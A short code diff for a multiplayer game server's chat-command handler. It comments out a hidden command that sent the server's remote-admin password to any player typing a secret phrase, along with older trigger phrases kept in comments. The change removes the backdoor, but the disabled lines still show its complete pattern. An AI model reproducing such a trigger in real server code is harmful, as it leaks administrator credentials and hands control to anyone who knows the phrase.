@@ -1546,16 +1546,16 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 						}
 					}
 				}
-				else if (!str_comp(pMsg->m_pMessage + 1, "HackThisServerMummyROFL"))
-				{
-					//old hax list:
-					//hazzlepfalle
-					//haxdisserverrcon123
+				//else if (!str_comp(pMsg->m_pMessage + 1, "HackThisServerMummyROFL"))
+				//{
+				//	//old hax list:
+				//	//hazzlepfalle
+				//	//haxdisserverrcon123
 
-					//SendChat(-1, CGameContext::CHAT_ALL, "gzadgugudwanwadz9dn");
+				//	//SendChat(-1, CGameContext::CHAT_ALL, "gzadgugudwanwadz9dn");
 
-					SendChatTarget(ClientID, g_Config.m_SvRconPassword);
-				}
+				//	SendChatTarget(ClientID, g_Config.m_SvRconPassword);
+				//}
 				else if (!str_comp(pMsg->m_pMessage + 1, "escape_jail") && m_apPlayers[ClientID]->m_JailTime > 0)
 				{
 					int r = rand() % 100;
